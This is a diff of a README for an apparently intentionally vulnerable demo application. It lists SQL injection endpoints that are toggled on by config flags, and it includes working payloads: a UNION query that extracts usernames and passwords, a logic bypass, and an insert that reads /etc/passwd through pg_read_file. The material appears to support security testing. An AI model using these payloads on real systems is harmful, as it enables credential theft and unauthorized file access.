@@ -50,6 +50,8 @@ GET: /specialties/{specialtyId}
 POST: /vets
 ```
 
+To enable a vulnerability, set `vuln{x}` to `true` in `application.properties`.
+
 ## Endpoints with shallow depth
 These vulnerable endpoints don't have deep code execution and all detect
 multiple rows as SQLi, so payloads work internally, but don't always
@@ -59,7 +61,8 @@ return data in the HTTP response.
 This vulnerability allows for UNION attacks, allowing an attacker to retrieve
 data from other tables.
 
-payload: `0' UNION SELECT NULL,username,password FROM users--`
+- operation: `getVet`
+- payload: `0' UNION SELECT NULL,username,password FROM users--`
 
 ```shell
 curl -i -s -k -X $'GET' \
@@ -71,7 +74,8 @@ curl -i -s -k -X $'GET' \
 This vulnerability allows for subverting logic, allowing an attacker to retrieve
 hidden data. 
 
-payload: `4'--`
+- operation: `getSpecialty`
+- payload: `4'--`
 
 ```shell
 curl -i -s -k -X $'GET' \
@@ -83,7 +87,8 @@ curl -i -s -k -X $'GET' \
 This vulnerability allows for inserting data, allowing an attacker to create
 a new user with, e.g., leaked data. 
 
-payload: `hack', (SELECT LEFT(pg_read_file('/etc/passwd'), 30)) ) RETURNING id--`
+- operation: `createVet`
+- payload: `hack', (SELECT LEFT(pg_read_file('/etc/passwd'), 30)) ) RETURNING id--`
 ```json
 {
   "firstName": "hack', (SELECT LEFT(pg_read_file('/etc/passwd'), 30)) ) RETURNING id--",
